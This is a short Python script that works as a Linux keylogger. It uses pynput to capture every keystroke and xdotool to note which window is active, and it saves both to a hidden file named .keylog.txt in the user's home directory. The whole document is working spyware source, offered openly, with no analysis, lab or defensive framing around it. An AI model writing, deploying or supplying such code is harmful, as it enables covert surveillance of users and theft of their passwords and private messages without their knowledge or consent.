from pynput import keyboard
import os
import time
import logging
import subprocess

# Hidden log file (in user's home directory)
log_dir = os.path.expanduser("~")
log_file = os.path.join(log_dir, ".keylog.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

# Get active window title (Linux specific)
def get_active_window():
    try:
        window = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"]).decode("utf-8")
        return window.strip()
    except:
        return "Unknown Window"

current_window = ""

def on_press(key):
    global current_window
    try:
        new_window = get_active_window()
        if new_window != current_window:
            current_window = new_window
            logging.info(f"\n[Window: {current_window}]")

        if hasattr(key, 'char') and key.char:
            logging.info(f"{key.char}")
        else:
            logging.info(f"[{key.name}]")
    except Exception as e:
        logging.error(f"Error: {str(e)}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
